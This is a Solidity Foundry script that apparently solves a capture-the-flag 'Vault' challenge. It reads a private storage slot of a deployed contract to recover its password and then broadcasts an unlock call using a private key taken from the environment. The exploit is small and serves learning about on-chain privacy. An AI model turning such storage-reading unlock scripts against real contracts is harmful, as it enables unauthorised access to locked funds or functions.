// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { Vault } from "../src/Vault.sol";

contract VaultSolver is Script {

    Vault public instance = Vault(0xB2CBDD190cE09355100573A9031Ac8CEc701A2e3);

	uint256 prv = vm.envUint("PRV");
	address pub = vm.envAddress("PUB");

    function run() external {
        vm.startBroadcast(prv);
        
        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));
        // console.log("we got the password", password);
        bytes32 locked = vm.load(address(instance), bytes32(0));
        instance.unlock("A very strong secret password :)");
        locked = vm.load(address(instance), bytes32(0));
        
        vm.stopBroadcast();
    }

}

